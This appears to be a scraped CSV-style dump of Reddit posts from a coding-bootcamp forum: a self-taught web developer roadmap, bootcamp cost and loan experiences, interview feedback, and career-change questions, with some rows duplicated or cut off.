5. If you don’t have a college degree, it might be good to fix that situation. Not all developers have a CS Degree but the vast majority have a four-year degree in *something*. It’s hard to go wrong with CS but other majors you might consider include MIS, Business Analytics, and UX Design. Some schools even offer web development degrees. Note: You don’t need to finish a degree before looking for your first job, but having one will eventually unlock opportunities for you. Highly recommended.

**ADVANCED TOPICS**

Once you’ve landed that first job, it’s good to continue learning. The topics below will help you to progress in your career. Note, you don’t need to do all of these. Rather, pick and choose those that interest you. That being said, you really should do the Typescript one at some point.

**CONCLUSION**

I hope this answer is helpful. It is the product of years of being both a self-taught and a professional developer, as well as a team leader and engineering manager.

Please share this answer with your network. The question of ""how do I learn to code"" comes up on Quora often, and I feel this is one of the best answers to it.

Thank you for reading and welcome to the world of web development.

Good luck!",One of the best roadmaps I've seen for becoming a web dev on your own. Maybe you'll find it as helpful as I did.," 

This is the roadmap I wish I’d had when I first started learning to code. I keep it updated regularly so be sure to bookmark it and check back.

**BUILD YOUR PORTFOLIO PROJECT**

This next step is critical. By now, you’ve learned enough to build your own full-stack web application and you need to cement that knowledge by, well, actually building one.

This project will be your primary portfolio project and will be the first thing potential employers will want to look at, so put your best effort into it. Pay attention to design, including responsive design, and assume someone will be looking at the code. Write good tests and use the best design patterns you’ve learned over the last several months.

If you don’t know what to build, try one of the following:

* A Blog Engine
   * This is a simple CMS or content management system that will allow you to create a blog online. You should be able to create and edit blog posts from an admin panel and users should be able to comment on those posts. You should be able to moderate those comments as necessary
* A Fake Dating Site
   * Create a Tinder-like dating site for superheroes, muppets, or whatever. A character looking for love should be able to log in, see potential matches, and communicate with them. You should create several of these profiles to demonstrate site functionality
* An eCommerce Site
   * Create an eCommerce site for a mock product. Users should be able to log in, add items to their cart, and check out. The app should deduct items from inventory as necessary and you should be able to open an admin panel that allows you to control the whole operation

Any one of those projects will teach you a ton about full-stack development. Once you start planning features and dealing with things like authentication and authorization you will run into a lot of the same pain points that professionals deal with every day. Expect long periods of “stuckness”. Use Stack Overflow as necessary and stay the course. You can do this!

Don’t continue on until you’ve completed this step.

**DEPLOY YOUR PORTFOLIO PROJECT**

Now that you’ve built your portfolio project, you’ll want to deploy it in a professional way. One way to do that is to use AWS. AWS is a vital skill for developers but many people outside the field aren’t even sure what the heck AWS even is. That’s okay! Well, it WAS okay. Now it is time for you to start learning about it.

Here’s an introduction video to the topic

And here is a video about how you can deploy a NodeJS application to AWS using a service called Elastic Beanstalk. Note, this isn’t the only way to deploy your app but it will get you some experience with the core AWS services developers need to know about.

**GOING PRO**

When you reach this point you will be very close to job ready. You could probably do freelance work already. If your goal is to work at a software development company, however, you will need to get past the dreaded technical interview.

Interviews at software companies basically have three parts. The first is the “behavioral” interview, which is just your standard job interview stuff. They’ll ask you about yourself and what you like to do, and just try to get a sense for cultural fit.

The next part is the coding challenge. In a coding challenge, you’ll be asked to solve challenges like “given an array of n numbers, find all the subsets of three numbers that add up to seven”.

To answer questions like these, you will need to understand data structures and algorithms.

We’ll get to the third part of the technical interview a little later on.

**LEARN DATA STRUCTURES AND ALGORITHMS**

Here is a good course to get you started on this fascinating topic. You’ll learn about complexity analysis and how to choose the best data structures for a given situation. It isn’t just about interviews. Knowing this stuff will make you a better engineer.

Once you’ve completed the course, you’ll want to practice coding challenges. The go-to place to do that is Leetcode.

[**LeetCode - The World's Leading Online Programming Learning Platform**Level up your coding skills and quickly land a job. This is the best place to expand your knowledge and get prepared for your next interview.https://leetcode.com/](https://leetcode.com/)

**LEARN SYSTEM DESIGN**

The last part of the technical interview is system design. You don’t always need to understand this at entry-level interviews but you might at larger companies or later in your career.

Here is an example of what a system design interview looks like

That video is made by a company called Exponent, and they have an excellent service for learning system design and really for code interview prep in general. The service even includes an opportunity to engage in peer-reviewed practice interviews. I recommend it.

**JOB HUNTING**

Congrats! By the time you reach this point in the roadmap you should be well-prepared to go out and land a job as an entry-level developer. Here are some job-hunting tips

1. You need to have three critical things for potential employers:
   1. A professional-looking LinkedIn profile. Make sure you’ve got a picture posted and some activity to show. Follow some people you admire and post updates about things you’re learning or are interested in. Stay away from “Facebook” style garbage posts. Keep posts focused on your career.
   2. Your Github profile. Make sure you’re showing your best work and staying active with your projects. Some employers look at your recent activity to see how passionate you are about code
   3. A link to your *deployed* portfolio project. It must be deployed! Don’t expect a hiring manager to clone your repo and build it from source because guess what? They won’t.
2. Until you have some experience, build a skills-focused resume. Google that term for details.
3. Get experience any way you can! If you’re doing freelance work, post your big projects on LinkedIn or start your own consultancy and post that as soon as you begin taking work.
4. Network! Join a local coding group and make sure you attend the meets. If there isn’t one in your area, start one. That’s exactly how I got started in my career.
5. If you don’t have a college degree, it might be good to fix that situation. Not all developers have a CS Degree but the vast majority have a four-year degree in *something*. It’s hard to go wrong with CS but other majors you might consider include MIS, Business Analytics, and UX Design. Some schools even offer web development degrees. Note: You don’t need to finish a degree before looking for your first job, but having one will eventually unlock opportunities for you. Highly recommended.

**ADVANCED TOPICS**

Once you’ve landed that first job, it’s good to continue learning. The topics below will help you to progress in your career. Note, you don’t need to do all of these. Rather, pick and choose those that interest you. That being said, you really should do the Typescript one at some point.

codingbootcamp,"I think it would be cool to start a thread (don’t know if it’s been done before) about which bootcamp you attended, cost, curriculum, etc etc, to help others have a centralized post to reference.
I’ll start!

I’m located in USA. The bootcamp I went to is called Thinkful, owned by Chegg, it was called something else before being acquired by Chegg although I am not too sure about the previous name.
I did the deferred payment plan, which means I had to take out a loan for $12k. If you live in cities considered tech hubs they’ll give you a stipend of $1500 month so you can attend full time on top taking out the loan. They do ask that you’re available 60 hours a week if you choose to attend full time and do extra hours with your cohort. They have a clause that they’ll forgive your loan if you can’t find a job making at least $45k/year after graduating…. More on that in a bit.

When I started I was working, and taking care of my son so I decided to do the full stack software engineering part time which was self paced, but I quickly realized that I still basically had to put in 40 hours a week in order to not fall behind on any of my work.

They said if you do the program full time you finish in 5 months, part time 6 months, but you are allowed to ask for 3 month extension, but doing so will mean you forfeit the loan forgiveness part of the contract you signed.

The full stack program teaches everything JavaScript/web development. So I learned HTML/CSS/JS as well as Bootstrap, React, React router for front end, and I learned Express, Nodejs, Knexjs and PostgreSQL for backend. Towards the very end they introduced data structures and algorithms. They do pair you up with a mentor and you have to meet with them for an hour each week, and honestly it’s a hit or miss with the mentors.

After graduating I was paired up with a career coach, and she’s really nice, but all she does really is gather a list of jobs from LinkedIn, Indeed, etc sends it my way and I apply to the positions. Some of them are not even related to software engineering, but the salary is more than $50k because if you get *ANY* job paying more than $45k you have to start paying your loan immediately.
If you choose to get the stipend that is actually not deferred, if I remember correctly, and you basically have to start paying it upon graduating, regardless of whether you’re employed or not.

After graduating I’ve found out about the Odin Project, which Thinkful is a sponsor of, or a partner, so basically the Odin Project teaches everything I learned at Thinkful for free lol.

I’d still recommend Thinkful though, because I did learn a lot of things, and I have a good enough portfolio(I think) that has gotten me interviews for Junior developer roles, unfortunately when I interview for these companies they want somebody with what seems like 5+ years of experience for entry level roles and I haven’t really had much luck landing a job aside from a part time job as a junior dev at a local small company… which I managed to get on my own through LinkedIn and not thru the jobs I’m being sent by the career coach.

Anyways, please share your bootcamp and your overall experience for others to compare.",Which bootcamp did you attend?,"I think it would be cool to start a thread (don’t know if it’s been done before) about which bootcamp you attended, cost, curriculum, etc etc, to help others have a centralized post to reference.
I’ll start!

I’m located in USA. The bootcamp I went to is called Thinkful, owned by Chegg, it was called something else before being acquired by Chegg although I am not too sure about the previous name.
I did the deferred payment plan, which means I had to take out a loan for $12k. If you live in cities considered tech hubs they’ll give you a stipend of $1500 month so you can attend full time on top taking out the loan. They do ask that you’re available 60 hours a week if you choose to attend full time and do extra hours with your cohort. They have a clause that they’ll forgive your loan if you can’t find a job making at least $45k/year after graduating…. More on that in a bit.

When I started I was working, and taking care of my son so I decided to do the full stack software engineering part time which was self paced, but I quickly realized that I still basically had to put in 40 hours a week in order to not fall behind on any of my work.

They said if you do the program full time you finish in 5 months, part time 6 months, but you are allowed to ask for 3 month extension, but doing so will mean you forfeit the loan forgiveness part of the contract you signed.

The full stack program teaches everything JavaScript/web development. So I learned HTML/CSS/JS as well as Bootstrap, React, React router for front end, and I learned Express, Nodejs, Knexjs and PostgreSQL for backend. Towards the very end they introduced data structures and algorithms. They do pair you up with a mentor and you have to meet with them for an hour each week, and honestly it’s a hit or miss with the mentors.

codingbootcamp,"Hi! Apologies as I know this has been done 1 million times before, but I’ve read many of those posts and am hoping you all can find it in your hearts to help me more specifically?

I’m in my late 20s working as a teacher at a special needs school and want to pivot completely to a software design career. I have *some experience and a lot of lifelong interest to motivate me (and have been doing a lot of research and using Code Academy for practice) but am still VERY much a beginner and obviously need a lot of help.

I’m absolutely broke, but of course am willing to save for the right *affordable boot camp or program, but still really need to keep affordability in mind. I would also need a program that allows part-time and is either based in NYC or (ideally) remote. My goal is to get a software engineering job in the future, so the quality and success of a boot camp is important to me of course.

I’d love to do the self-taught method, but unfortunately that would lack the structure I need. I’ve heard of and have heard great  things about  Grace Hopper or Fullstack Academy, but they’re a bit pricey. I like Yandex’s Practicum a lot by the looks of it, but don’t know if that’s a good program. I’ve heard Thinkful sucks, and I’ve checked out a few more. 

Any help? I’d love to hear your experiences with programs and finances.

Both queries contain the same column (visitorid) to help make these merge. Just trying to figure out the right way to do it

So originally the first query was meant to be a bridge table to connect to multiple other tables. I'd like to now bring the results for a student in a bridge table to now include it into the 2nd table.

The reason for this is because when I try to bring in the 1st query, the query times out and doesn't fully run because there are millions of rows, where the 2nd one will only use a partial amount of the bridge table to identify.

The first query:

codingbootcamp,"I guess this is a venting post so only read if that interests you, but I thought of a question at the end (in bold)

So I did all the SheCodes workshops and had fun with it. They're more self-paced though and just CSS, HTML, vanilla JS, and React. I'm sure they don't cover a lot of those, but either way I had fun with it and it was like $1k with a coupon to do them all. But I know it wasn't enough to land a front-end job and many job ads want you to know backend as well. 

So I looked into boot camps and joined one that people on here often rave about. I think it is good and it's full of kind people and instructors, but my brain doesn't appear to be storing what we learn bc I always need help on the graded homework assignments. Things to start to come together a bit but I keep thinking ""if I couldn't do this alone at all, how would I ever pass an interview?"" and I keep thinking that if last week was the first week and more information just keeps coming, am I even really learning to the extent of retaining much information at all? Or am I trying to learn, working with others on daily homework, then mostly forgetting the content learned? 

I'm not sure if that even makes sense but I am thinking about withdrawing and going back to work while self studying or doing Launch even though those options take a lot longer, I just don't think I am going to remember much at the end of the bootcamp if it's just cramming so much info in in such a short amount of time. I understand it's worked for tons of people who do a bootcamp then get a great job right after or within a few months. But I just can tell this sort of thing isn't for everyone and I have the time right now to try one so I wanted to try, and now I'm realizing I do NOT really learn at such a fast pace. And you end up too distracted to eat, get enough sleep, shower, exercise lol. Like sure it's just 3 months but that's not healthy and your health can change in just a few months if you aren't taking good care of your body. 

I don't know the point of my post but I can tell these work well for many but also might end up like me and realizing you don't really learn at this type of pace. Like I feel like information rushes into my brain and then it doesn't stay. I could do most of the first three days assignments on my own but needed help on a couple problems. After that I was just so lost. I can't imagine adding more information at this pace over more weeks honestly.

codingbootcamp,"I feel many people in this subreddit who are thinking about joining a bootcamp, ask this question: are coding bootcamps worth doing? My honest answer: **it really depends on you. Nobody can answer this question for you, except for yourself.**

Why?

I want to preface this by saying, coding bootcamps **are NOT a golden ticket** to a software engineering job. These programs are expensive (15 to 20k on average), very stressful, and will take up most of your time throughout the bootcamp. For full time programs, students can spend anywhere from 60 to 80+ hours a week working. This is something that everyone should be aware of when thinking about joining a coding bootcamp.

Coding bootcamps started around a decade ago and have grown exponentially since then. I think this growth is not particularly a good thing, since the market now is completely oversaturated, more noticeably at the entry level. The golden age of coding bootcamps passed a while ago, HOWEVER, this does not mean you cannot get a job.

I completed a part-time coding bootcamp and was able to land a job around \~4 months after I graduated from my program. I worked my ass off in the program and was able to finish in the top 3 of my class. The job search after, I feel was even more difficult than the bootcamp itself. I mass applied everywhere I could, studied hard for interviews and networked as much as I could. All the effort paid off when I was able to land a software engineering role.

Will this be the outcome for everyone? I don’t know. This entirely depends on you, and how much effort you put into working in your bootcamp and after. Work your goddamn ass off so you will have a better chance of landing that job.

Some advice: If you are in a bootcamp now, take advantage of everything that is given to you. If you feel stuck, constantly ask questions to teachers, assistants and your classmates. I would redo all the workshops from scratch to help solidify what I previously learned. I used the Pomodoro technique during studying to be more focused and not get burnt out. 

Hope this helps! Also, don't hesitate to reach out to me, I would love to help out in any way I can.",My thoughts on if coding bootcamps are worth doing,"I feel many people in this subreddit who are thinking about joining a bootcamp, ask this question: are coding bootcamps worth doing?

codingbootcamp,"Hi all,

I don't know if this is being said anywhere, but the pedagogy of CSX is really not grounded in any sort of good practice. 

Solid pedagogy is the ""I do - we do - you do"" method.

In other words:

* Explanation of the theory/concept
* An example
* Ideally, an example of what *not* to do
* Opportunity to practice
* FEEDBACK

Feedback is crucial to learning (see any research paper on effective pedagogy).  

CSX lacks most of these elements.  

Someone else posted: ""There is zero explanation in CSX prep so if you don't go into it already knowing JS you're stuck googling all day which is essentially teaching yourself. To be clear, I'm a self starter, I simply think that if the school is going to offer prep, said prep course should teach you the fundamentals they want you to learn, which their course does not do."" This is my experience as well. 

Now... if the goal of the course is ""teach people how to Google"" -- fine. That's fair, since most coding gigs require this. But then there should be an entire section dedicated to teaching us how to Google, and that should be reinforced throughout the course (e.g. teach us alternatives to Google, how to read through other resources like w3 schools, etc).

codingbootcamp,"Hi everyone.

Long story short I'm failing to graduate in a coding bootcamp (full stack).

I've got very lucky and won a scholarship to save some money but I will still have to pay the school back even if I don't graduate.

Most students complete the Bootcamp in 6 months and some of them get a job right away.

Unfortunately I had a family member who died and I had to take care of my family between working two jobs and stuff.

What I don't like about this Bootcamp is that the support does not care at all.

The instructor even made fun of me in a classroom because I'm too ""slow"" to complete assignments but I've explained that a family member of mine died so a lot of things happened. This instructor didn't know what to say and said he was just ""kidding"". Ok.

I feel like this is not working for me. I fall behind and I'm not getting any support from the instructors. Nobody cares. They just care about my money.

What should I do next?

I don't want to give up programming.

This Bootcamp has been the worst experience I've ever had including all my family stuff that happened where I had no control.

The Director of the school keeps telling me if I graduate I will still get a job. Most students are still looking for a job after a few months they completed the Bootcamp course.

So If I complete the Bootcamp I should be able to get something back and still have to pay the loan back.

If I dropout I won't get anything but still have to pay the loan back.

I feel like a complete failure and I'm ashamed of not being able to complete this Bootcamp at this time.

What would you suggest?

Thank you for your support.","Failing in a Coding Bootcamp, now what?","Hi everyone.

Long story short I'm failing to graduate in a coding bootcamp (full stack).

I've got very lucky and won a scholarship to save some money but I will still have to pay the school back even if I don't graduate.

Most students complete the Bootcamp in 6 months and some of them get a job right away.

Unfortunately I had a family member who died and I had to take care of my family between working two jobs and stuff.

What I don't like about this Bootcamp is that the support does not care at all.

The instructor even made fun of me in a classroom because I'm too ""slow"" to complete assignments but I've explained that a family member of mine died so a lot of things happened. This instructor didn't know what to say and said he was just ""kidding"". Ok.

I feel like this is not working for me. I fall behind and I'm not getting any support from the instructors. Nobody cares. They just care about my money.

What should I do next?

I don't want to give up programming.

This Bootcamp has been the worst experience I've ever had including all my family stuff that happened where I had no control.

The Director of the school keeps telling me if I graduate I will still get a job. Most students are still looking for a job after a few months they completed the Bootcamp course.

So If I complete the Bootcamp I should be able to get something back and still have to pay the loan back.

If I dropout I won't get anything but still have to pay the loan back.

I feel like a complete failure and I'm ashamed of not being able to complete this Bootcamp at this time.

What would you suggest?

codingbootcamp,"I've gotten past the non-technical interview, and am having issues with the assessments. My one-on-one didn't guide me in how to improve my css (I failed 2/4 assessments because I got one line of css wrong) and instead sent me a link that I already read and couldn't entirely understand.

I need mentors that are more helpful, etc, but if no that, then a free learning program.

A little history: I started working at my family print shop right out of high school and have about 10 years of customer service experience but no college degree.

codingbootcamp,"Hey all, 

Little bit of context - I did my undergrad in music, and have worked as a piano teacher / gigger for the past 10+ years.  The money is actually pretty good (I tend to gross \~90k, but then there's self-employment taxes, health insurance, etc.), and I care about what I do, but with a growing family, working almost exclusively nights and weekends is decidedly not good fit.  

I feel a bit overwhelmed, because when I look at job boards, I I'm 99% sure I don't have any of the skills, the resume, or the certifications to replace my current income with a more traditional 9-5 job with benefits.  A couple people have suggested coding to me, but I have no clue where to start.  A couple questions: 

1) Are 12 / 24-week coding boot camps a legitimate option to landing a good job upon completion?  If I start down that road, study hard, and apply myself, can I have confidence in having  in-demand skills and being able to change careers, or am I just kidding myself and will find myself having a hard time compared to younger people with full 4-year software engineering / computer science degrees? 

2) What boot camps are most worth actually considering (i.e. not scams, have proven track records of job placement, etc.).  I'll read more on the boards here, too. 

3) Are there particular ""tracks,"" skill sets, etc. that are going to lead to more hirability, better salary, and more upward mobility in companies and moving between companies than others?  Again, this is something I need to read more about, but any guidance on what to pay most attention to (i.e. full stack vs. front end vs. back end).  

4) What salary could I reasonably expect to actually earn starting out?  I have a feeling that even if I landed a job, I'll be taking a pay decrease, but if it allows for more stability, better work-family balance, and opportunity to advance in career, maybe it's worth it.

2) What boot camps are most worth actually considering (i.e. not scams, have proven track records of job placement, etc.).  I'll read more on the boards here, too. 

3) Are there particular ""tracks,"" skill sets, etc. that are going to lead to more hirability, better salary, and more upward mobility in companies and moving between companies than others?  Again, this is something I need to read more about, but any guidance on what to pay most attention to (i.e. full stack vs. front end vs. back end).  

4) What salary could I reasonably expect to actually earn starting out?  I have a feeling that even if I landed a job, I'll be taking a pay decrease, but if it allows for more stability, better work-family balance, and opportunity to advance in career, maybe it's worth it.

codingbootcamp,"Hello all,

I have some questions about the 19-week hack reactor program.

1. How are the test structured in the class. I have been studying JS, HTML, CSS for a while now, but am concerned the tests throughout the class are really difficult. Are their tests proctored and timed, or are they more relaxed with it (do them at your own pace). I am more concerned with being tested than putting in the work. I can retain information fine, but under pressure for me is difficult.
2. Is it hard to get admitted into the 19 week program? I have an unrelated degree from a great school, but just self taught coding experience.
3. Do a lot of people fail out? Also, how do they fail? From the tests or are they not able to complete assignments on time?
4. Was it worth it, and is it possible to land a FANNG job with no prior coding job?

I'm also doing another bootcamp for Full Stack Development which I'm honestly more interested in.

What I dislike about the program are the mandatory zoom classes. Now if we were actually going over material that would be fantastic, but the large majority of these classes are dedicated to soft skills and behavioral mindset scenarios that I'm just not interested in, and at this point I just dread having to attend class because of how boring these activities are. I've been taking the course in mid-late August and we probably only talked about actually material 2-3 times.

codingbootcamp,"Since I’ve received a decent number of messages about my last review (here AND on LinkedIn, clever those of you who have connected those dots, I was not expecting a message ""I saw your post on Reddit"" LOL), and I have now completed my first “Challenge,” it is time to post an update.

So, the first challenge I was assigned is “Algo Blitz.” The expected timeline had me finishing at week 4, or October 21, but I just passed the final subchallenge today, and so I’ll be moving on to “Algo Marathon.” To be perfectly honest, before I began the program I could only solve a small handful of LeetCode Easy problems. I had a little bit more success on Codeforces Rank 800, but still not much.  
 Now, after just three weeks, I can actually reliably solve LeetCode Easy and some Medium. I actually find the algorithmic challenges fun, when even just a short time ago I found them super daunting. I just applied for a job at Cisco, and prior to a few weeks ago I would only have known how to solve one of the problems, now I could solve them all with plenty of time remaining.

Also, coming up I have a resume review with a career coach, as well as a few mock phone interviews. So that will be really nice practice.

Things I like about the program:

· The live sessions. The sessions are normally broken up into small group (normally about 4-5 of us Fellows, plus a Mentor), or into a one-on-one session between two Fellows. I can read and watch videos about different algorithms all day, but what really, truly helps me understand them is being able to verbally discuss them with other people and this is such a huge help. Since the group sizes are so small, everyone gets a chance to actively participate.

· Speaking of the Mentors: most of them are active employees at Google, Amazon, etc. They have real insight into what is required to work at top tech firms.

· Which leads to, networking. Not only do most of the Mentors work in top tech firms, a lot of my co-Fellows have also been actively working in the industry for some time. Not gonna lie, there was a part of me that mentally fan-boyed when I recently had sessions with employees at some of my favorite gaming studios. There are a few of us coming into the program fresh out of boot camp without ever having worked in the field, but it seems like most have decent backgrounds.

· Also, the  platform. Honestly, the learning platform is really intuitive and easy to use and really helps keep you focused.

Things I do not like (but appreciate):

Oh my god, I’m so tired. Like, my bootcamp said it was going to be time-intensive, and I’m sure for a lot of people it was, but up until the final project I was able to get all my work done on Saturdays and almost ignore it other than our one session a week. I’m actually really used to spending less time on a task than would take most other people (thus why I’m so much more productive than any of my coworkers at my current day job).

With Formation, I do have sessions basically every day that I do not have blocked off. When I’m not in a session, I’m constantly either studying or completing assignments or practicing on LeetCode or AlgoExpert or any number of other things.

I say I don’t like it, but truly it is great. I haven’t been this challenged by anything in a long time, nor have I ever felt this much improvement in such a short amount of time.

Anyway, as I complete future challenges, or if my opinion takes a surprising turn to the negative, I’ll be sure to post updates if people continue to be interest, but for now I think this program really might be as good as advertised. Of course, the real test will be whether it helps me actually get a decent job, lol, but either way I feel more confident in myself now than I did before.","Formation, Week 3 Thoughts","Since I’ve received a decent number of messages about my last review (here AND on LinkedIn, clever those of you who have connected those dots, I was not expecting a message ""I saw your post on Reddit"" LOL), and I have now completed my first “Challenge,” it is time to post an update.

codingbootcamp,"Hello everyone, I am posting to this subreddit because I need some help and guidance so any help with that is greatly appreciated. So I want to apply to a coding bootcamp but there are so many options that I feel it is a bit overwhelming. My goal is to find something that will help me land a remote anywhere job so that I can be at home with my Family. I mention this because although I am a US Citizen my wife and children live in another country at the moment and I hate traveling for long periods of time and being away from them. We are currently in the process of applying for Visas and all the things needed to bring them to the US, but in the meantime I want to try and land a remote job if it is at all possible.

So with that being said, I am not sure if a coding bootcamp will give me that opportunity or if I should just look at something else. I have started teaching myself a bit of coding using [freecodecamp.org](https://freecodecamp.org) and I do enjoy it and find it interesting. So I have an interest for it, I just don't know where to look or if it is a good option at the moment since I am looking for a remote job.

So any opinions or advice would be greatly appreciated.

codingbootcamp,"I'm graduating in December with my CS degree. My school was very coding-heavy, and we were constantly building projects. However, I've realized that a lot of the technology that we were using was old. Java without Spring. Very little web dev. Very little frameworks, etc.

So naturally, I'm thinking that it might be worth it to do a bootcamp and get practical knowledge of current frameworks/ best practices. I'm a veteran, so I can do this for free. There would just be a time cost and no money cost.

Is it worth it? And if it is, what is the best bootcamp for someone who already has general coding knowledge from a CS degree?

codingbootcamp,"This was the feedback given to me by them
. How should I improve from here. My next &amp; final interview is also a pair programming one. 
```
Thank you for taking some time to chat with our team again. I wanted to follow up with the specific feedback that was discussed from your second technical interview.

Improvements from your first interview:
- JS Fundamentals - you demonstrated a very solid understanding of a number of native JS functions and fundamentals, including pass by reference/pass by value, closure, recursion and array methods.

- Problem Solving - you demonstrated a strong ability to solve problems with code using conditional logic, loops and JS data types.

- Thoughtful Communication - you caught yourself and apologized on a few occasions where you started to navigate the problem while still in the driver role while pair programming and asked me if you need to slow down while communicating your approach.

Areas for continued growth:
- Technical Communication - When you communicate your approach you tend to talk faster and it gets harder to follow. Due to the accent you have coming from India, it will be extra important to communicate slowly and methodically to keep your partner on track with your thinking. To your credit, you have already identified this and asked me if you should slow down. It would also be a good idea to omit technical details like which array method you would use during your high level approach. Leave the technical details to the driver to implement the way they choose to.

- Pair Programming - You obviously love to code and like solving hard problems. You will need work hard to refrain from taking over the navigator role while acting as the driver. It might be a good idea to actually stop trying to solve the problem on your own so that you can just focus on your partner and implement the strategy they are thinking of. There were a few times where it was hard for me to coax you into trying something I was thinking of because you were also thinking of your own solution.

- OOP - Continue to develop an understanding of OOP fundamentals.

codingbootcamp,"Hello All,

Please bear with me as I longwindedly explain my current predicament and need for advice. I also realize this may not be the correct sub, so you are welcome to recommend more appropriate ones if needed.

**My background:** I have been in healthcare for about 20 years. Not on the front lines, but working at a corporate headquarters handling quality improvement, KPIs (key performance indicators), federal regulations, things like that. I dealt a lot with the technical and analytical folks and worked closely with them to design reports and QA results.  I had a great job and was well respected and highly paid. I was in a leadership position. I got laid off last year due to a company takeover and quickly scrambled to get something, which ended up being in the government healthcare sector.  Nowhere near as in depth or technical, and I no longer have a worthy voice or opinion.  I also took a huge pay cut. I’m just a lowly analyst now.

I absolutely positively hate my job and the company I work for.  But I cannot seem to get a new one no matter how hard I try. I have applied for hundreds of jobs and reached out to any contacts in the industry for positions similar to what I had before, even lower-level ones, to no avail. It appears that my skills are just not transferable, probably because I do not have formal training in anything important (note: I am college educated and have a Master’s degree).   

**Back to the point:** I have always been interested in data, data analysis/analytics, coding, programming, testing, data mapping, data validation, software application development, etc. I have no formal experience with any of it though. But, I have been involved in it all for many years. I have worked with others that create queries and reports and I know enough to be able to sometimes QA the code to expose an issue.  This would include SAS, SQL, R mostly. 

I know I am very detail oriented and have been told by multiple people in this line of work that I would be great at it, and I agree with this. I can describe how a report should function, what data sources/variables/specifics are needed, how they are connected, and can also determine where the problem is if the report comes back faulty. But, I can’t write code or read it fluently.

I want a job where my primary role is related to data analytics and/or coding, digging into the code of an existing application and making updates, performing data validation, quality assurance, mapping different data sources, or building something from scratch. Also developing reports or enhancing existing ones.  Something along these lines.

The first problem is that I don’t even know what a job title like this would be called.  Data scientist? Developer? Software Engineer? Not just a data analyst. I need a higher paying job and am certain I can handle it. What would a relevant position be? My experience has been exclusive to healthcare clinical data but I don’t want to necessarily limit it to that.

**End game:** I realize I need formal training. Not just because I am switching career avenues, but also because I literally cannot find a job with my current skillset. 

I want to make sure that whatever education I choose is teaching me the right skills, for one. And it isn’t just a crash course that I won’t retain.  I need something that is basically guaranteed to get me a job, a good job, after graduating/becoming certified/etc. I don’t want to start at the very bottom. As I said, I have some experience already, just not direct/formal.

So now the main question is, given all of this background, would you recommend a coding bootcamp or getting a Master’s Degree in something technical. (I already have an MBA and that got me nowhere, career-wise). Please do not suggest self-teaching. I need structured learning, I need a mentor, a teacher, classes, homework etc. I cannot just do it alone. I know many can, but not me. It's not my learning style.

If you recommend a Bootcamp, can you please go as far as indicating the specific company and what the bootcamp should be in? Is a bootcamp from an accredited university better than one of the other companies like CodeSmith etc etc etc I don't even know the names of most of them.

If you think getting another Master’s degree is better, there are a lot of options for different programs (general Computer Science, software development, data analytics, and so on), so I don’t know which schools are actually reputable for this kind of thing. Nor do I know what the degree should specifically be in, in order to get the job I am looking for. 

I am desperate for advice. I really wish someone could \[accurately\] say “Oh you need take these classes, get this degree, do x y and z, and then you can apply for these types of jobs”.  **I need a very clear path to getting the job I am describing above**, which I assume includes education and training of some sort.

codingbootcamp,"Even if you simply do the math , you need 1 data scientist for every 20 developers or even the ratio is even more skewed sometimes, unless your product is heavily ML driven.   
Other than that these fields are to a greater degree Gatekeeped. Lot of folks for frustrated Stem Majors , who have huge contextual experience with data(Engg Phd's, Dev Econ folks, consulting analyst pivots).  


You will most likely be only considered for analytics positions, for which honestly ML is an overkill, what could get you employed in 3 might very well end up taking 9  
Analytics/BI mostly consists :  


Python/R  
Some Specific Libraries according to use cases.  
SQL  
Tableau/ Power BI  


The smarter approach to ML/Data Science careers would be be a developer for 2 years then transition to ML , you won't be gatekeeped by resume, you will have developed self teaching skills by then &amp; you can come back to development if you dont like ML anymore(this might not be possible if you start with , you might end up getting Silo'd)  


Another Approach might be to learn Data Engineering/ Cloud Developer Roles. This is also creates sufficient room to experiment and provides a greater degree of job security.

Otherwise folks might add their opinions to this and might think differently but this is what i feel is the realistic view of the market.  


This post came to be after reading Codesmith's newsletter on how they are beta testing a Machine learning and DS bootcamp.  


You have to understand all the bootcamps dont have YOUR best interests in their heart, regardless of they reputed they are. They are focussing on this HUGE WORD THAT GIVES STARTUP BROS BONER : ""GROWTH""  


They need to keep getting more people every year than the previous, for that they need to keep making new products(courses/programs) in this case. You are very much the Guinea Pig in these Bootcamps. Also when bootcamps state that their grads are big tech and other companies, they never mention whether that was immediately after the program. A bootcamp grad making it to Walmart after 3 years of working post completion of program is not the optimal representation of a bootcamp outcome and they are teaching you.

P.S: dont comment on mental health posts, I am just trying to exist like everyone on this planet, i just dont have time to run multiple accounts",Why you should not join Data Science &amp; Machine Learning Bootcamps in my personal opinion and how to be wary of predatory bootcamps,"Even if you simply do the math , you need 1 data scientist for every 20 developers or even the ratio is even more skewed sometimes, unless your product is heavily ML driven.   
Other than that these fields are to a greater degree Gatekeeped. Lot of folks for frustrated Stem Majors , who have huge contextual experience with data(Engg Phd's, Dev Econ folks, consulting analyst pivots).  


You will most likely be only considered for analytics positions, for which honestly ML is an overkill, what could get you employed in 3 might very well end up taking 9  
Analytics/BI mostly consists :  


Python/R  
Some Specific Libraries according to use cases.  
SQL  
Tableau/ Power BI  


The smarter approach to ML/Data Science careers would be be a developer for 2 years then transition to ML , you won't be gatekeeped by resume, you will have developed self teaching skills by then &amp; you can come back to development if you dont like ML anymore(this might not be possible if you start with , you might end up getting Silo'd)  


Another Approach might be to learn Data Engineering/ Cloud Developer Roles. This is also creates sufficient room to experiment and provides a greater degree of job security.

Otherwise folks might add their opinions to this and might think differently but this is what i feel is the realistic view of the market.  


This post came to be after reading Codesmith's newsletter on how they are beta testing a Machine learning and DS bootcamp.  


You have to understand all the bootcamps dont have YOUR best interests in their heart, regardless of they reputed they are. They are focussing on this HUGE WORD THAT GIVES STARTUP BROS BONER : ""GROWTH""  


They need to keep getting more people every year than the previous, for that they need to keep making new products(courses/programs) in this case. You are very much the Guinea Pig in these Bootcamps. Also when bootcamps state that their grads are big tech and other companies, they never mention whether that was immediately after the program. A bootcamp grad making it to Walmart after 3 years of working post completion of program is not the optimal representation of a bootcamp outcome and they are teaching you.

5. My prior work experience is not at all related to tech. Should I still include it on my resume?

I'm so confused and I really don't know what to do now. I've used up all of my savings, so I'll have to find a part-time job to sustain myself.

codingbootcamp,"Pros and cons based on a subpar experience below. Saw a recent one that outlined mostly cons, and one after linking that post with mostly pros. Not joining a debate or taking sides, to each their own. Going to link stuff on both sides to show that if online stuff is believable.

